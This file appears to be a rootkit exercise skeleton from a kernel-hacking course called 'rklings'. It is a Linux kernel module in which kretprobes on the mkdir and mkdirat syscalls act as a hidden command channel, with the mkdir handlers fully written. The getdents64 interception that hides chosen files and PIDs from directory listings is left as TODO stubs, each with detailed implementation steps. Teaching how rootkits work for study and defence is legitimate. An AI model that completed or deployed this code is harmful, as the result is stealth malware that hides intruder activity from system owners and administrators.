// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128
#define RK_TARGET_MAX 32
#define RK_NAME_MAX   64

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

static struct rk_target_list file_targets;
static struct rk_target_list pid_targets;

/* TODO: Implement rk_target_add(list, name)
 * spin_lock_irqsave, check count < max, strscpy, count++, spin_unlock_irqrestore
 */
static int rk_target_add(struct rk_target_list *list, const char *name)
{
	/* TODO: implement */
	return -ENOSYS;
}

/* TODO: Implement rk_target_remove(list, idx)
 * spin_lock_irqsave, validate idx, memmove to close gap, count--, spin_unlock_irqrestore
 */
static int rk_target_remove(struct rk_target_list *list, int idx)
{
	/* TODO: implement */
	return -ENOSYS;
}

/* TODO: Implement rk_target_match(list, name)
 * spin_lock_irqsave, iterate and strcmp, return true/false, spin_unlock_irqrestore
 */

/* ---- getdents64 interception ---- */

struct getdents_data {
	void __user *ubuf;
};

/* TODO: Implement should_hide_dirent(name)
 * Check name against file_targets and pid_targets using rk_target_match.
 */

/* TODO: Implement getdents_entry(ri, regs)
 * __x64_sys_getdents64 is a syscall wrapper: extract nested pt_regs first.
 *   uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0)
 * Then read the user buffer pointer from uregs->si into ri->data.
 * Return 1 if uregs is NULL to skip the return handler.
 */
static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	/* TODO: implement */
	return 0;
}

/* TODO: Implement getdents_return(ri, regs)
 * Get total byte count from regs_return_value. If <= 0, return.
 * kmalloc a kernel buffer, copy_from_user the dirent buffer.
 * Walk variable-length records: cast (kbuf + off) to struct linux_dirent64.
 * For each record, if should_hide_dirent(d->d_name):
 *   memmove to close the gap, subtract d_reclen from new_total.
 * Otherwise advance off by d_reclen.
 * If total changed: copy_to_user, regs_set_return_value with new total.
 * kfree the buffer.
 */
static int getdents_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	/* TODO: implement */
	return 0;
}

static struct kretprobe getdents_probe = {
	.handler        = getdents_return,
	.entry_handler  = getdents_entry,
	.data_size      = sizeof(struct getdents_data),
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_getdents64",
};

/* ---- mkdir command dispatcher (provided) ---- */

static int rk_dispatch(const char *name)
{
	int idx;

	if (strncmp(name, "h.f.", 4) == 0)
		return rk_target_add(&file_targets, name + 4);
	if (strncmp(name, "u.f.", 4) == 0) {
		if (kstrtoint(name + 4, 10, &idx) == 0)
			return rk_target_remove(&file_targets, idx);
		return -EINVAL;
	}
	if (strncmp(name, "h.i.", 4) == 0)
		return rk_target_add(&pid_targets, name + 4);
	if (strncmp(name, "u.i.", 4) == 0) {
		if (kstrtoint(name + 4, 10, &idx) == 0)
			return rk_target_remove(&pid_targets, idx);
		return -EINVAL;
	}

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
			     const char __user *pathname)
{
	struct rk_mkdir_data *data;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base + RK_PREFIX_LEN);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
				struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
				  struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler  = rk_mkdir_entry_mkdir,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

static struct kretprobe rk_mkdirat_probe = {
	.kp.symbol_name = "__x64_sys_mkdirat",
	.entry_handler  = rk_mkdir_entry_mkdirat,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

/* ---- module lifecycle ---- */

static int __init rk_init(void)
{
	int ret;

	spin_lock_init(&file_targets.lock);
	spin_lock_init(&pid_targets.lock);

	/* TODO: Register the getdents kretprobe. */
	/* TODO: Register the mkdir kretprobe. On failure, unregister getdents. */

	return 0;
}

static void __exit rk_exit(void)
{
	/* TODO: Unregister mkdir kretprobe, then getdents kretprobe. */
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings dirent filter");
